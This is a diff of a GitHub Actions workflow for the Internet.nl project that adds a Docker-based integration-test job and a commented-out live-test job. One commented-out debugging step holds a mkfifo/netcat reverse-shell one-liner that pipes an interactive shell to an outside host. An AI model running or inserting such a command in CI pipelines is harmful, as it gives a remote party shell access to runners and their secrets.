@@ -1,5 +1,11 @@
 name: Internet.nl
 
+env:
+  DOCKER_IMAGE: ghcr.io/internetstandards/internet.nl:develop
+  DOCKER_IMAGE_UNBOUND: ghcr.io/internetstandards/internet.nl:unbound
+  RELEASE_IMAGE: ghcr.io/internetstandards/internet.nl:latest
+  TEST_RUNNER_IMAGE: ghcr.io/internetstandards/internet.nl:test-runner
+
 on:
   pull_request:
   push:
@@ -9,6 +15,150 @@ on:
 
 
 jobs:
+  integration-test:
+    runs-on: ubuntu-22.04
+    steps:
+      - uses: actions/checkout@v3
+        # include vendor/ submodules used to build dependencies like nassl and unbound
+        with:
+          submodules: recursive
+
+      # login to pull images from Github registry
+      - name: Login to Docker Hub
+        uses: docker/login-action@v2
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Prefetch docker-compose dependencies in background
+        run: make docker-compose-pull-dependencies &
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@v2
+
+      - name: Build app image
+        uses: docker/build-push-action@v4
+        with:
+          context: .
+          file: docker/Dockerfile
+          target: app
+          load: true
+          tags: ${{ env.DOCKER_IMAGE }}
+          cache-from: |
+            type=gha
+            ${{ env.DOCKER_IMAGE }}
+          cache-to: type=gha,mode=max
+          # makes build images better usable as cache by allowing individual layers to be pulled from cache
+          build-args: BUILDKIT_INLINE_CACHE=1
+
+      - name: Push app image
+        run: docker push ${{ env.DOCKER_IMAGE }}
+
+      - name: Build unbound image
+        uses: docker/build-push-action@v4
+        with:
+          context: .
+          file: docker/Dockerfile
+          target: unbound
+          load: true
+          tags: ${{ env.DOCKER_IMAGE_UNBOUND }}
+          cache-from: |
+            type=gha
+            ${{ env.DOCKER_IMAGE_UNBOUND }}
+          cache-to: type=gha,mode=max
+          # makes build images better usable as cache by allowing individual layers to be pulled from cache
+          build-args: BUILDKIT_INLINE_CACHE=1
+
+      - name: Push unbound image
+        run: docker push ${{ env.DOCKER_IMAGE_UNBOUND }}
+
+      - name: Build test runner image
+        uses: docker/build-push-action@v4
+        with:
+          context: .
+          file: docker/Dockerfile.test-runner
+          load: true
+          tags: ${{ env.TEST_RUNNER_IMAGE }}
+          cache-from: |
+            type=gha
+            ${{ env.TEST_RUNNER_IMAGE }}
+          cache-to: type=gha,mode=max
+          # makes build images better usable as cache by allowing individual layers to be pulled from cache
+          build-args: BUILDKIT_INLINE_CACHE=1
+
+      - name: Push test runner image
+        run: docker push ${{ env.TEST_RUNNER_IMAGE }}
+
+      # TODO: debugging
+      # - name: Throw interactive shell
+      #   if: always()
+      #   shell: bash -i {0}
+      #   run: |
+      #               rm /tmp/f>/dev/null 2>&1;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ijohan.nl 1337 >/tmp/f&
+
+      - name: Start test instance
+        run: |
+          make docker-compose-up environment=test
+
+      - name: Run integration tests
+        run: make integration-tests environment=test
+
+      - name: Archive test results
+        uses: actions/upload-artifact@v3
+        if: always()
+        with:
+          name: integration-test-results
+          path: |
+            integration_tests/test-results/
+
+  # live-test:
+  #   runs-on: ubuntu-22.04
+  #   strategy:
+  #     matrix:
+  #       # don't need to test multiple versions since everything runs in Docker,
+  #       # but keep consistent with rest of the jobs
+  #       python-version: [ "3.9" ]
+  #   steps:
+  #     - uses: actions/checkout@v3
+  #       # include vendor/ submodules used to build dependencies like nassl and unbound
+  #       with:
+  #         submodules: recursive
+  #
+  #     # login to pull images from Github registry
+  #     - name: Login to Docker Hub
+  #       uses: docker/login-action@v2
+  #       with:
+  #         registry: ghcr.io
+  #         username: ${{ github.actor }}
+  #         password: ${{ secrets.GITHUB_TOKEN }}
+  #     # https://docs.docker.com/build/cache/backends/gha/
+  #     - name: Switch to caching Docker driver
+  #       run: docker buildx create --use --driver=docker-container
+  #
+  #     - name: Prefetch docker-compose dependencies in background
+  #       run: make docker-compose-pull-dependencies &
+  #
+  #     - name: Build and push
+  #       uses: docker/build-push-action@v4
+  #       with:
+  #         context: .
+  #         file: docker/Dockerfile
+  #         push: true
+  #         tags: ${{ env.DOCKER_IMAGE }}
+  #         cache-from: type=gha
+  #         cache-to: type=gha,mode=max
+  #
+  #     - name: Set up Python ${{ matrix.python-version }}
+  #       uses: actions/setup-python@v2
+  #       with:
+  #         python-version: ${{ matrix.python-version }}
+  #     - name: Make venv
+  #       run: make venv
+  #     - name: Run live tests
+  #       run: make live-tests
+
+
   build:
     runs-on: ubuntu-20.04
     timeout-minutes: 15
@@ -73,9 +223,6 @@ jobs:
             ./nassl_freebsd/
           key: ${{ runner.os }}-${{ matrix.python-version }}-v5-venv-and-deps-${{ hashFiles('**/requirements*.txt', 'Makefile', '.github/workflows/*') }}
       # the venv and all (slow) custom dependencies is only built when there was no cache hit.
-      - name: Setup Application Configuration
-        run: |
-          cp ./internetnl/settings-dist.py ./internetnl/settings.py
       - name: Make venv (if not from cache)
         run: make venv
         if: ${{ steps.cache-venv.outputs.cache-hit != 'true' }}
